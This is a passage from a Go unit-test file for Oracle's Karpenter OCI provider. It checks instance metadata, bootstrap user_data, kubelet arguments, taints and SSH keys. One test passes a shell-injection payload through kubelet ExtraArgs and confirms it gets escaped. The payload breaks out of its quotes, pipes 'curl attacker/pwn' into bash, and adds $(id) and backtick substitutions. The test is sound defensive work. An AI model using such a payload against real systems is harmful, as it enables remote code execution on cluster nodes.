/*
** Karpenter Provider OCI
**
** Copyright (c) 2026 Oracle and/or its affiliates.
** Licensed under the Universal Permissive License v 1.0 as shown at https://oss.oracle.com/licenses/upl/
 */

package instancemeta

import (
	"context"
	"encoding/base64"
	"log"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	ociv1beta1 "github.com/oracle/karpenter-provider-oci/pkg/apis/v1beta1"
	"github.com/oracle/karpenter-provider-oci/pkg/fakes"
	"github.com/oracle/karpenter-provider-oci/pkg/providers/image"
	"github.com/oracle/karpenter-provider-oci/pkg/providers/network"
	ocicore "github.com/oracle/oci-go-sdk/v65/core"
	"github.com/samber/lo"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	corev1 "sigs.k8s.io/karpenter/pkg/apis/v1"
)

var (
	ipV4SingleStack = []network.IpFamily{network.IPv4}
	ipV6SingleStack = []network.IpFamily{network.IPv6}
	ipV6DualStack   = []network.IpFamily{network.IPv4, network.IPv6}
)

func TestProvider_BuildInstanceMetadata_PreBaked_SetsKeysAndNPN(t *testing.T) {
	p, err := NewProvider(context.TODO(), "10.0.0.1", []byte("CA"), ipV4SingleStack)
	if err != nil {
		t.Fatalf("NewProvider error: %v", err)
	}

	nc := &ociv1beta1.OCINodeClass{
		Spec: ociv1beta1.OCINodeClassSpec{
			KubeletConfig: &ociv1beta1.KubeletConfiguration{
				NodeLabels: map[string]string{"k": "v"},
				MaxPods:    lo.ToPtr(int32(50)),
			},
			NetworkConfig: &ociv1beta1.NetworkConfig{
				PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
					SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
						SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..aaa")},
					},
				},
				SecondaryVnicConfigs: []*ociv1beta1.SecondaryVnicConfig{{}},
			},
			SshAuthorizedKeys: []string{"ssh-rsa AAA", "ssh-ed25519 BBB"},
		},
	}
	// OKE Image happy path
	img := &image.ImageResolveResult{
		ImageType: ociv1beta1.OKEImage,
		OsVersion: lo.ToPtr(ociv1beta1.OracleLinux),
		Images:    []*ocicore.Image{{DisplayName: lo.ToPtr("EG9XA")}},
	}
	netres := &network.NetworkResolveResult{
		PrimaryVnicSubnet: &network.SubnetAndNsgs{Subnet: &ocicore.Subnet{Id: lo.ToPtr("ocid1.subnet.oc1..aaa")}},
		OtherVnicSubnets:  []*network.SubnetAndNsgs{{Subnet: &ocicore.Subnet{Id: lo.ToPtr("ocid1.subnet.oc1..bbb")}}},
	}

	testCases := []struct {
		maxPods  *int32
		ipCounts []*int
		expect   string
	}{
		{
			maxPods:  nil,
			ipCounts: []*int{lo.ToPtr(16)},
			expect:   "16",
		},
		{
			maxPods:  lo.ToPtr(int32(50)),
			ipCounts: []*int{lo.ToPtr(16), lo.ToPtr(10)},
			expect:   "26",
		},
		{
			maxPods:  lo.ToPtr(int32(20)),
			ipCounts: []*int{lo.ToPtr(16), lo.ToPtr(10)},
			expect:   "20",
		},
	}

	for _, tc := range testCases {
		secondaryVnicConfigs := make([]*ociv1beta1.SecondaryVnicConfig, 0)
		for _, ipCount := range tc.ipCounts {
			secondaryVnicConfigs = append(secondaryVnicConfigs, &ociv1beta1.SecondaryVnicConfig{
				SimpleVnicConfig: ociv1beta1.SimpleVnicConfig{
					SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
						SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..aaa")},
					},
				},
				IpCount: ipCount,
			})
		}

		nc.Spec.KubeletConfig.MaxPods = tc.maxPods
		nc.Spec.NetworkConfig.SecondaryVnicConfigs = secondaryVnicConfigs

		meta, err := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, netres, false)
		assert.NoError(t, err)
		// user_data present
		assert.NotEmpty(t, meta["user_data"])
		// ssh keys joined with newline
		assert.Equal(t, "ssh-rsa AAA\nssh-ed25519 BBB", meta["ssh_authorized_keys"])
		// initial node labels quoted
		assert.Equal(t, "\"k=v\"", meta["oke-initial-node-labels"])
		// NPN flags
		assert.Equal(t, ValueTrue, meta["oke-preconfigured-vnics"])
		assert.Equal(t, ValueTrue, meta["oke-native-pod-networking"])
		assert.Equal(t, tc.expect, meta["oke-max-pods"])
	}
}

func TestProvider_BuildInstanceMetadata_shouldFailedIfMaxPodsSmallerThanPodPerCore(t *testing.T) {
	testCases := []struct {
		maxPods              *int32
		PodsPerCore          *int32
		numbOfSecondaryVincs int
		expectedErrorMessage string
		ipFamilies           []network.IpFamily
	}{
		{
			lo.ToPtr(int32(50)),
			lo.ToPtr(int32(60)),
			1,
			"PodsPerCore 60 bigger than MaxPods 32",
			ipV4SingleStack,
		},
		{
			lo.ToPtr(int32(30)),
			lo.ToPtr(int32(60)),
			2,
			"PodsPerCore 60 bigger than MaxPods 30",
			ipV6DualStack,
		},
		{
			lo.ToPtr(int32(70)),
			lo.ToPtr(int32(80)),
			2,
			"PodsPerCore 80 bigger than MaxPods 64",
			ipV4SingleStack,
		},
		{
			lo.ToPtr(int32(200)),
			lo.ToPtr(int32(150)),
			0,
			"PodsPerCore 150 bigger than MaxPods 110",
			ipV6DualStack,
		},
		{
			lo.ToPtr(int32(512)),
			lo.ToPtr(int32(512)),
			1,
			"PodsPerCore 512 bigger than MaxPods 256",
			ipV6SingleStack,
		},
		{
			lo.ToPtr(int32(256)),
			lo.ToPtr(int32(512)),
			2,
			"PodsPerCore 512 bigger than MaxPods 256",
			ipV6SingleStack,
		},
	}

	// OKE Image happy path
	img := &image.ImageResolveResult{
		ImageType: ociv1beta1.OKEImage,
		OsVersion: lo.ToPtr(ociv1beta1.OracleLinux),
		Images:    []*ocicore.Image{{DisplayName: lo.ToPtr("EG9XA")}},
	}

	for _, tc := range testCases {
		p, err := NewProvider(context.TODO(), "10.0.0.1", []byte("CA"), tc.ipFamilies)
		if err != nil {
			t.Fatalf("NewProvider error: %v", err)
		}

		svnicsConfigs := make([]*ociv1beta1.SecondaryVnicConfig, 0)
		svnicsResolution := make([]*network.SubnetAndNsgs, 0)
		for range tc.numbOfSecondaryVincs {
			svnicsConfigs = append(svnicsConfigs, &ociv1beta1.SecondaryVnicConfig{
				SimpleVnicConfig: ociv1beta1.SimpleVnicConfig{
					SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
						SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..aaa")},
					},
				},
			})

			svnicsResolution = append(svnicsResolution, &network.SubnetAndNsgs{
				Subnet: &ocicore.Subnet{Id: lo.ToPtr("ocid1.subnet.oc1..bbb")},
			})
		}

		nc := &ociv1beta1.OCINodeClass{
			Spec: ociv1beta1.OCINodeClassSpec{
				KubeletConfig: &ociv1beta1.KubeletConfiguration{
					NodeLabels:  map[string]string{"k": "v"},
					MaxPods:     tc.maxPods,
					PodsPerCore: tc.PodsPerCore,
				},
				NetworkConfig: &ociv1beta1.NetworkConfig{
					PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
						SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
							SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..aaa")},
						},
					},
					SecondaryVnicConfigs: svnicsConfigs,
				},
				SshAuthorizedKeys: []string{"ssh-rsa AAA", "ssh-ed25519 BBB"},
			},
		}

		netres := &network.NetworkResolveResult{
			PrimaryVnicSubnet: &network.SubnetAndNsgs{Subnet: &ocicore.Subnet{Id: lo.ToPtr("ocid1.subnet.oc1..aaa")}},
			OtherVnicSubnets:  svnicsResolution,
		}

		_, err = p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, netres, false)
		assert.Error(t, err)
		assert.Equal(t, tc.expectedErrorMessage, err.Error())
	}
}

func TestProvider_BuildInstanceMetadata_NoNPNFlagsWhenNoSecondaryOrSubnets(t *testing.T) {
	p, err := NewProvider(context.TODO(), "10.0.0.2", []byte("CA2"), ipV4SingleStack)
	if err != nil {
		t.Fatalf("NewProvider error: %v", err)
	}

	nc := &ociv1beta1.OCINodeClass{
		Spec: ociv1beta1.OCINodeClassSpec{
			NetworkConfig: &ociv1beta1.NetworkConfig{
				PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
					SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
						SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..ccc")},
					},
				},
				SecondaryVnicConfigs: nil, // empty
			},
		},
	}
	img := &image.ImageResolveResult{
		ImageType: ociv1beta1.OKEImage,
		Images:    []*ocicore.Image{{}},
	}
	netres := &network.NetworkResolveResult{
		PrimaryVnicSubnet: &network.SubnetAndNsgs{Subnet: &ocicore.Subnet{Id: lo.ToPtr("ocid1.subnet.oc1..ccc")}},
		OtherVnicSubnets:  nil,
	}

	meta, err := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, netres, false)
	assert.NoError(t, err)
	assert.Equal(t, ValueFalse, meta["oke-preconfigured-vnics"])
	// Absent optional keys when not preconfigured
	_, hasMaxPods := meta["oke-max-pods"]
	_, hasNpn := meta["oke-native-pod-networking"]
	assert.False(t, hasMaxPods)
	assert.False(t, hasNpn)
}

func TestProvider_BuildInstanceMetadata_AppendsPostBootstrapScript(t *testing.T) {
	p, err := NewProvider(context.TODO(), "10.0.0.3", []byte("CACERT"), ipV4SingleStack)
	if err != nil {
		t.Fatalf("NewProvider error: %v", err)
	}
	script := "echo hi"
	nc := &ociv1beta1.OCINodeClass{
		Spec: ociv1beta1.OCINodeClassSpec{
			PostBootstrapInitScript: lo.ToPtr(base64.StdEncoding.EncodeToString([]byte(script))),
			NetworkConfig: &ociv1beta1.NetworkConfig{
				PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
					SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
						SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..ddd")},
					},
				},
			},
		},
	}
	img := &image.ImageResolveResult{ImageType: ociv1beta1.OKEImage, Images: []*ocicore.Image{{}}}
	netres := &network.NetworkResolveResult{
		PrimaryVnicSubnet: &network.SubnetAndNsgs{Subnet: &ocicore.Subnet{Id: lo.ToPtr("ocid1.subnet.oc1..ddd")}},
	}
	meta, err := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, netres, false)
	assert.NoError(t, err)

	decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
	assert.NoError(t, derr)
	// The script content is base64 encoded and appended on a new line
	assert.True(t, strings.Contains(string(decoded), "\n"+script))
}

func TestProvider_BuildInstanceMetadata_UnsupportedImageErrors(t *testing.T) {
	p, err := NewProvider(context.TODO(), "10.0.0.4", []byte("CACERT"), ipV4SingleStack)
	if err != nil {
		t.Fatalf("NewProvider error: %v", err)
	}
	img := &image.ImageResolveResult{
		ImageType: ociv1beta1.Custom,
		Images:    []*ocicore.Image{{DisplayName: lo.ToPtr("CustomImage")}},
	}
	nc := &ociv1beta1.OCINodeClass{
		Spec: ociv1beta1.OCINodeClassSpec{
			NetworkConfig: &ociv1beta1.NetworkConfig{
				PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
					SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
						SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..zzz")},
					},
				},
			},
		},
	}
	_, gotErr := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, &network.NetworkResolveResult{
		PrimaryVnicSubnet: &network.SubnetAndNsgs{Subnet: &ocicore.Subnet{Id: lo.ToPtr("ocid1.subnet.oc1..zzz")}},
	}, false)
	assert.Error(t, gotErr)
	assert.ErrorIs(t, gotErr, InstanceMetadataError)
	assert.Equal(t, `cannot construct instance metadata: image type "Custom"`, gotErr.Error())
}

var provider *DefaultProvider

func setupTest(t *testing.T) func(t *testing.T) {
	log.Println("setup test")

	testApiServerEndpoint := "10.1.0.10"
	testCAByte := []byte("DUMMY_CA")

	var err error
	provider, err = NewProvider(context.TODO(), testApiServerEndpoint, testCAByte, ipV4SingleStack)
	if err != nil {
		t.Fatalf("could not create DefaultProvider: %s", err.Error())
	}

	return func(tb *testing.T) {
		log.Println("teardown test")
	}
}

func TestProvider_AppendKubeletConfigs(t *testing.T) {
	teardownTest := setupTest(t)
	defer teardownTest(t)

	testCases := []struct {
		kubeletCfg     *ociv1beta1.KubeletConfiguration
		claim          *corev1.NodeClaim
		expectedResult string
	}{
		{nil, nil, ""},
		{
			&ociv1beta1.KubeletConfiguration{
				ClusterDNS:     []string{"dns1", "dns2"},
				NodeLabels:     map[string]string{"key1": "value1"},
				MaxPods:        lo.ToPtr(int32(20)),
				PodsPerCore:    lo.ToPtr(int32(10)),
				SystemReserved: map[string]string{"sr1": "srv1"},
				KubeReserved:   map[string]string{"kr1": "krv1"},
				EvictionHard:   map[string]string{"memory.available": "10M"},
				EvictionSoft:   map[string]string{"memory.available": "50M"},
				EvictionSoftGracePeriod: map[string]metav1.Duration{
					"memory.available": {Duration: time.Duration(int64(2000000000))}},
				EvictionMaxPodGracePeriod:   lo.ToPtr(int32(50)),
				ImageGCHighThresholdPercent: lo.ToPtr(int32(2000)),
				ImageGCLowThresholdPercent:  lo.ToPtr(int32(1000)),
				ExtraArgs:                   lo.ToPtr("--max-open-files=1000 --maximum-dead-containers=10"),
			},
			&corev1.NodeClaim{
				Spec: corev1.NodeClaimSpec{
					Taints: []v1.Taint{
						{Key: "key1", Effect: "NoSchedule"},
						{Key: "key2", Value: "value2", Effect: "NoExecute"},
					},
				},
			},
			" \\\n--cluster-dns dns1,dns2 \\\n " +
				"--kubelet-extra-args \"" +
				" --max-pods=20" +
				" --pods-per-core=10" +
				" --eviction-hard='memory.available<10M'" +
				" --eviction-soft='memory.available<50M'" +
				" --system-reserved=\\\"sr1=srv1\\\"" +
				" --kube-reserved=\\\"kr1=krv1\\\"" +
				" --eviction-soft-grace-period='memory.available=2s'" +
				" --eviction-max-pod-grace-period=50" +
				" --image-gc-high-threshold=2000" +
				" --image-gc-low-threshold=1000" +
				" --node-labels=\\\"key1=value1\\\"" +
				" --max-open-files=1000 --maximum-dead-containers=10" +
				" --register-with-taints=\\\"key1=present:NoSchedule," +
				"key2=value2:NoExecute,karpenter.sh/unregistered=present:NoExecute\\\"\"",
		},
		{
			&ociv1beta1.KubeletConfiguration{
				MaxPods: lo.ToPtr(int32(200)),
			},
			&corev1.NodeClaim{
				Spec: corev1.NodeClaimSpec{},
			},
			" \\\n --kubelet-extra-args \"" +
				" --max-pods=110 --register-with-taints=\\\"karpenter.sh/unregistered=present:NoExecute\\\"\""},
	}

	for _, tc := range testCases {
		testNodeClass := &ociv1beta1.OCINodeClass{
			Spec: ociv1beta1.OCINodeClassSpec{
				NetworkConfig: &ociv1beta1.NetworkConfig{},
				KubeletConfig: tc.kubeletCfg,
			},
		}

		expectedResult := expectedResult(provider, tc.expectedResult)

		bakedImage, err := provider.buildUserDataForPreBakedImage(tc.claim, testNodeClass)
		if err != nil {
			t.Fatalf("unexpecte: %s", err.Error())
		}
		decodedByte, err2 := base64.StdEncoding.DecodeString(bakedImage)
		if err2 != nil {
			t.Fatalf("unexpecte: %s", err2.Error())
		}
		result := string(decodedByte)

		t.Logf("expected = '%s', actual = '%s'", expectedResult, result)
		assert.Equal(t, expectedResult, result)
	}
}

func TestProvider_AppendKubeletExtraArgsEscapesShellMetacharacters(t *testing.T) {
	teardownTest := setupTest(t)
	defer teardownTest(t)

	extraArgs := "--node-status-update-frequency=10s\" ; curl attacker/pwn | bash ; echo \" --foo=$(id) --bar=`id`"
	testNodeClass := &ociv1beta1.OCINodeClass{
		Spec: ociv1beta1.OCINodeClassSpec{
			NetworkConfig: &ociv1beta1.NetworkConfig{},
			KubeletConfig: &ociv1beta1.KubeletConfiguration{
				ExtraArgs: lo.ToPtr(extraArgs),
			},
		},
	}

	bakedImage, err := provider.buildUserDataForPreBakedImage(nil, testNodeClass)
	require.NoError(t, err)

	decodedByte, err := base64.StdEncoding.DecodeString(bakedImage)
	require.NoError(t, err)
	result := string(decodedByte)

	assert.Contains(t, result, `--node-status-update-frequency=10s\" ; curl attacker/pwn | bash ; echo \"`)
	assert.Contains(t, result, `--foo=\$(id)`)
	assert.Contains(t, result, "--bar=\\`id\\`")
	assert.Equal(t, 1, strings.Count(result, `--kubelet-extra-args "`))
}

func expectedResult(provider *DefaultProvider, suffix string) string {
	var base strings.Builder
	base.WriteString("#!/usr/bin/env bash\n")
	base.WriteString("bash /etc/oke/oke-install.sh \\\n")
	base.WriteString("--apiserver-endpoint \"")
	base.WriteString(provider.apiServerEndpoint)
	base.WriteString("\" \\\n")
	base.WriteString("--kubelet-ca-cert \"")
	base.WriteString(provider.caString)
	base.WriteString("\"")

	base.WriteString(suffix)

	return base.String()
}

func TestProvider_BuildInstanceMetadata(t *testing.T) {
	t.Parallel()
	p, err := NewProvider(context.TODO(), "10.9.0.1", []byte("CA"), ipV4SingleStack)
	require.NoError(t, err)

	newImg := func(imgType ociv1beta1.ImageType) *image.ImageResolveResult {
		return &image.ImageResolveResult{
			ImageType: imgType,
			Images:    []*ocicore.Image{{DisplayName: lo.ToPtr("EG9XA_OL9_EVGAwesome")}},
			OsVersion: lo.ToPtr(ociv1beta1.OracleLinux),
		}
	}
	newNet := func(primary string, others ...string) *network.NetworkResolveResult {
		res := &network.NetworkResolveResult{
			PrimaryVnicSubnet: &network.SubnetAndNsgs{Subnet: &ocicore.Subnet{Id: lo.ToPtr(primary)}},
		}
		if len(others) > 0 {
			res.OtherVnicSubnets = lo.Map(others, func(s string, _ int) *network.SubnetAndNsgs {
				return &network.SubnetAndNsgs{Subnet: &ocicore.Subnet{Id: lo.ToPtr(s)}}
			})
		}
		return res
	}

	tests := []struct {
		name      string
		class     *ociv1beta1.OCINodeClass
		claim     *corev1.NodeClaim
		img       *image.ImageResolveResult
		net       *network.NetworkResolveResult
		assertion func(t *testing.T, meta map[string]string)
	}{
		{
			name: "oke_no_kubelet_no_ssh",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..p1")},
							},
						},
					},
					SshAuthorizedKeys: nil,
				},
			},
			claim: &corev1.NodeClaim{},
			img:   newImg(ociv1beta1.OKEImage),
			net:   newNet("ocid1.subnet.oc1..p1"),
			assertion: func(t *testing.T, meta map[string]string) {
				assert.NotEmpty(t, meta["user_data"])
				_, ok := meta["ssh_authorized_keys"]
				assert.False(t, ok)
			},
		},
		{
			name: "oke_only_cluster_dns",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					KubeletConfig: &ociv1beta1.KubeletConfiguration{
						ClusterDNS: []string{"10.0.0.10", "10.0.0.11"},
					},
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..p2")},
							},
						},
					},
				},
			},
			claim: &corev1.NodeClaim{},
			img:   newImg(ociv1beta1.OKEImage),
			net:   newNet("ocid1.subnet.oc1..p2"),
			assertion: func(t *testing.T, meta map[string]string) {
				decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
				require.NoError(t, derr)
				assert.Contains(t, string(decoded), "--cluster-dns 10.0.0.10,10.0.0.11")
			},
		},
		{
			name: "npn_secondary_only_false",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					KubeletConfig: &ociv1beta1.KubeletConfiguration{MaxPods: lo.ToPtr(int32(30))},
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..p3")},
							},
						},
						SecondaryVnicConfigs: []*ociv1beta1.SecondaryVnicConfig{{}},
					},
				},
			},
			claim: &corev1.NodeClaim{},
			img:   newImg(ociv1beta1.OKEImage),
			net:   newNet("ocid1.subnet.oc1..p3" /* no other subnets */),
			assertion: func(t *testing.T, meta map[string]string) {
				assert.Equal(t, ValueFalse, meta["oke-preconfigured-vnics"])
				_, ok1 := meta["oke-native-pod-networking"]
				_, ok2 := meta["oke-max-pods"]
				assert.False(t, ok1)
				assert.False(t, ok2)
			},
		},
		{
			name: "ssh_keys_empty_absent",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					SshAuthorizedKeys: nil,
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..p4")},
							},
						},
					},
				},
			},
			claim: &corev1.NodeClaim{},
			img:   newImg(ociv1beta1.OKEImage),
			net:   newNet("ocid1.subnet.oc1..p4"),
			assertion: func(t *testing.T, meta map[string]string) {
				_, ok := meta["ssh_authorized_keys"]
				assert.False(t, ok)
			},
		},
		{
			name: "postbootstrap_nil_no_append",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					PostBootstrapInitScript: nil,
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..p5")},
							},
						},
					},
				},
			},
			claim: &corev1.NodeClaim{},
			img:   newImg(ociv1beta1.OKEImage),
			net:   newNet("ocid1.subnet.oc1..p5"),
			assertion: func(t *testing.T, meta map[string]string) {
				decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
				require.NoError(t, derr)
				// ensure no arbitrary encoded script appears
				assert.NotContains(t, string(decoded), "ZWNobyBoaQ==") // base64("echo hi")
			},
		},
		{
			name: "kubelet_present_no_cluster_dns",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					KubeletConfig: &ociv1beta1.KubeletConfiguration{},
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..p6")},
							},
						},
					},
				},
			},
			claim: &corev1.NodeClaim{},
			img:   newImg(ociv1beta1.OKEImage),
			net:   newNet("ocid1.subnet.oc1..p6"),
			assertion: func(t *testing.T, meta map[string]string) {
				decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
				require.NoError(t, derr)
				assert.NotContains(t, string(decoded), "--cluster-dns")
			},
		},
		{
			name: "taints_only_startup",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..p7")},
							},
						},
					},
				},
			},
			claim: &corev1.NodeClaim{
				Spec: corev1.NodeClaimSpec{
					StartupTaints: []v1.Taint{
						{Key: "a", Value: "va", Effect: v1.TaintEffectNoSchedule},
						{Key: "b", Value: "vb", Effect: v1.TaintEffectNoExecute},
					},
				},
			},
			img: newImg(ociv1beta1.OKEImage),
			net: newNet("ocid1.subnet.oc1..p7"),
			assertion: func(t *testing.T, meta map[string]string) {
				decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
				require.NoError(t, derr)
				s := string(decoded)
				assert.Contains(t, s, "--register-with-taints=")
				assert.Contains(t, s, "a=va:NoSchedule")
				assert.Contains(t, s, "b=vb:NoExecute")
				assert.Contains(t, s, "karpenter.sh/unregistered=present:NoExecute")
			},
		},
		{
			name: "taints_both_lists",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..p8")},
							},
						},
					},
				},
			},
			claim: &corev1.NodeClaim{
				Spec: corev1.NodeClaimSpec{
					Taints: []v1.Taint{{Key: "x", Effect: v1.TaintEffectNoSchedule}},
					StartupTaints: []v1.Taint{
						{Key: "y", Value: "vy", Effect: v1.TaintEffectNoExecute},
					},
				},
			},
			img: newImg(ociv1beta1.OKEImage),
			net: newNet("ocid1.subnet.oc1..p8"),
			assertion: func(t *testing.T, meta map[string]string) {
				decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
				require.NoError(t, derr)
				s := string(decoded)
				assert.Contains(t, s, "--register-with-taints=")
				assert.Contains(t, s, "x=present:NoSchedule")
				assert.Contains(t, s, "y=vy:NoExecute")
				assert.Contains(t, s, "karpenter.sh/unregistered=present:NoExecute")
			},
		},
		{
			name: "dns_single_entry",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					KubeletConfig: &ociv1beta1.KubeletConfiguration{
						ClusterDNS: []string{"10.0.0.12"},
					},
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..p9")},
							},
						},
					},
				},
			},
			claim: &corev1.NodeClaim{},
			img:   newImg(ociv1beta1.OKEImage),
			net:   newNet("ocid1.subnet.oc1..p9"),
			assertion: func(t *testing.T, meta map[string]string) {
				decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
				require.NoError(t, derr)
				assert.Contains(t, string(decoded), "--cluster-dns 10.0.0.12")
			},
		},
		{
			name: "no_taints_no_startup",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..pa")},
							},
						},
					},
				},
			},
			claim: &corev1.NodeClaim{},
			img:   newImg(ociv1beta1.OKEImage),
			net:   newNet("ocid1.subnet.oc1..pa"),
			assertion: func(t *testing.T, meta map[string]string) {
				decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
				require.NoError(t, derr)
				assert.Contains(t, string(decoded), "--register-with-taints=\\\"karpenter.sh/unregistered=present:NoExecute\\\"")
			},
		},
		{
			name: "ssh_single_key",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					SshAuthorizedKeys: []string{"ssh-ed25519 ONLY"},
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..pb")},
							},
						},
					},
				},
			},
			claim: &corev1.NodeClaim{},
			img:   newImg(ociv1beta1.OKEImage),
			net:   newNet("ocid1.subnet.oc1..pb"),
			assertion: func(t *testing.T, meta map[string]string) {
				v, ok := meta["ssh_authorized_keys"]
				require.True(t, ok)
				assert.Equal(t, "ssh-ed25519 ONLY", v)
			},
		},
		{
			name: "node_labels_nil_absent",
			class: &ociv1beta1.OCINodeClass{
				Spec: ociv1beta1.OCINodeClassSpec{
					KubeletConfig: &ociv1beta1.KubeletConfiguration{
						NodeLabels: nil,
					},
					NetworkConfig: &ociv1beta1.NetworkConfig{
						PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
							SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
								SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("ocid1.subnet.oc1..pc")},
							},
						},
					},
				},
			},
			claim: &corev1.NodeClaim{},
			img:   newImg(ociv1beta1.OKEImage),
			net:   newNet("ocid1.subnet.oc1..pc"),
			assertion: func(t *testing.T, meta map[string]string) {
				_, ok := meta["oke-initial-node-labels"]
				assert.False(t, ok)
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
